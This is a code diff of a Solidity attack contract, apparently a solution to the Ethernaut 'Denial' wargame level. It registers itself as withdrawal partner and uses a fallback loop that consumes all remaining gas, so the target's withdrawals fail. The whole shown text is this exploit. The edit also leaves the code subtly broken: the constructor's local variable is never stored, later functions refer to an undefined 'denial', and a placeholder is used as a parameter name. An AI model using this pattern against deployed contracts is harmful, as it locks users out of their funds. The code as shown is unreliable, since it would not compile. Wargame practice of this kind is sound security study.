@@ -6,15 +6,20 @@ interface Denial {
     function withdraw() external;
     function contractBalance() external returns (uint);
 }
+
 contract Attack {
+
+    constructor(address $your_ethernaut_instance_here) {
+        Denial denial = Denial($your_ethernaut_instance_here);
+    }
+    
     function attack() public {
-        Denial denial = Denial(0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e);
         denial.setWithdrawPartner(address(this));
         denial.withdraw();
     }
 
     fallback() external payable {
-        Denial denial = Denial(0x860a86f0038Fe4Ba6ce24c6eBC2b8BD901D7a26e);
+        // eat up all the rest of the gas when Denial sends funds to this addr
         uint i;
         uint start = gasleft();
         while (gasleft() <= start) {
